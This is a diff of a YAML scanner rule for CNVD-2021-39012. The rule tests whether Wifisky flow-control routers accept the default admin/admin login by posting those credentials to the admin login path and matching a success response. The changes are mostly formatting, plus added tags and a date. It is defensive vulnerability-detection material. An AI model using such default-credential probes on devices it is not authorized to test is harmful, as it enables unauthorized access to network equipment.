@@ -1,20 +1,22 @@
 id: CNVD-2021-39012
 
 info:
-    name: Wifisky Default Password
-    author: Print1n(http://print1n.top)
-    severity: high
-    verified: false
-    description: | 
-        app="WIFISKY-7层流控路由器"
-    reference:
+  name: Wifisky Default Password
+  author: Print1n
+  severity: high
+  verified: false
+  description: |-
+    app="WIFISKY-7层流控路由器"
+  reference:
     - https://securityforeveryone.com/tools/wifisky-default-password-scanner
+  tags: cnvd,cnvd2021,default-login
+  created: 2021/10/23
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /login.php?action=login&type=admin
-            body: username=admin&password=admin
-        expression: response.status == 200 && response.headers["content-type"].contains("text/html") && response.body.bcontains(b'"success":"true"') && response.body.bcontains(b'"data":')
+  r0:
+    request:
+      method: POST
+      path: /login.php?action=login&type=admin
+      body: username=admin&password=admin
+    expression: response.status == 200 && response.headers["content-type"].contains("text/html") && response.body.bcontains(b'"success":"true"') && response.body.bcontains(b'"data":')
 expression: r0()
